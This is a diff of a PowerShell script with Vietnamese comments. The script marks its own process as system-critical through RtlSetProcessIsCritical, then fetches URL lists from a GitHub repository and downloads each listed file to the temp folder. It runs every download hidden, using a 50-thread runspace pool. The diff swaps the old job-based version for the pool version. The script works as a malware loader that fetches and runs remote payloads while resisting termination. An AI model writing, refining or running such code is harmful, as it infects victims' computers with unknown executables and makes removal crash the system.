@@ -25,45 +25,65 @@ function CriticalProcess {
     }
 }
 CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
-# Hợp nhất danh sách URL từ cả hai nguồn
+# 1. Thu thập danh sách URL
 $sources = @(
     "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt",
     "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/urls.txt"
 )
 
 $allUrls = foreach ($s in $sources) {
-    (Invoke-WebRequest -Uri $s -UseBasicParsing).Content -split "`n" | Where-Object { $_.Trim() -ne "" }
+    try {
+        (Invoke-WebRequest -Uri $s -UseBasicParsing -TimeoutSec 10).Content -split "`n" | Where-Object { $_.Trim() -ne "" }
+    } catch { write-host "Không thể kết nối tới nguồn: $s" -ForegroundColor Red }
 }
 
-# Cấu hình số lượng luồng tối đa (5 tasks)
-$maxThreads = 50
-$jobs = @()
+# 2. Thiết lập Runspace Pool với 50 tầng (threads)
+$sessionState = [system.management.automation.runspaces.initialsessionstate]::CreateDefault()
+# Tham số: (Số luồng tối thiểu, Số luồng tối đa)
+$pool = [runspacefactory]::CreateRunspacePool(1, 50, $sessionState, $Host)
+$pool.Open()
 
+$threads = @()
+
+# 3. Đẩy tác vụ vào các tầng
 foreach ($u in $allUrls) {
     $u = $u.Trim()
     
-    # Đợi nếu đã đủ 5 task đang chạy
-    while (($jobs | Where-Object { $_.State -eq 'Running' }).Count -ge $maxThreads) {
-        Start-Sleep -Milliseconds 500
-    }
-
-    # Bắt đầu một task mới
-    $jobs += Start-Job -ScriptBlock {
+    $powershell = [powershell]::Create().AddScript({
         param($url)
         try {
             $fileName = [System.IO.Path]::GetFileName($url)
-            $tempPath = Join-Path $env:TEMP $fileName
+            $path = Join-Path $env:TEMP $fileName
             
-            # Tải xuống tệp
-            Invoke-WebRequest -Uri $url -OutFile $tempPath -UseBasicParsing
+            # Tải xuống với thiết lập tối ưu
+            Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
             
-            # Thực thi tệp (ẩn)
-            Start-Process -FilePath $tempPath -WindowStyle Hidden
+            # Thực thi ẩn
+            Start-Process -FilePath $path -WindowStyle Hidden
         } catch {
-            # Ghi lỗi nếu cần thiết
+            # Bỏ qua lỗi nếu file không tồn tại hoặc link chết
         }
-    } -ArgumentList $u
+    }).AddArgument($u)
+
+    $powershell.RunspacePool = $pool
+    
+    # Kích hoạt luồng
+    $threads += New-Object PSObject -Property @{
+        Instance = $powershell
+        Handle   = $powershell.BeginInvoke()
+    }
 }
 
-# Đợi tất cả hoàn thành
-Wait-Job $jobs | Out-Null
+# 4. Giám sát (Tùy chọn: Đợi cho đến khi tất cả hoàn tất)
+Write-Host "Đang chạy 50 luồng tải xuống..." -ForegroundColor Cyan
+while ($threads.Handle.IsCompleted -contains $false) {
+    Start-Sleep -Milliseconds 100
+}
+
+# 5. Giải phóng bộ nhớ
+$threads | ForEach-Object {
+    $_.Instance.EndInvoke($_.Handle)
+    $_.Instance.Dispose()
+}
+$pool.Close()
+Write-Host "Hoàn thành!" -ForegroundColor Green
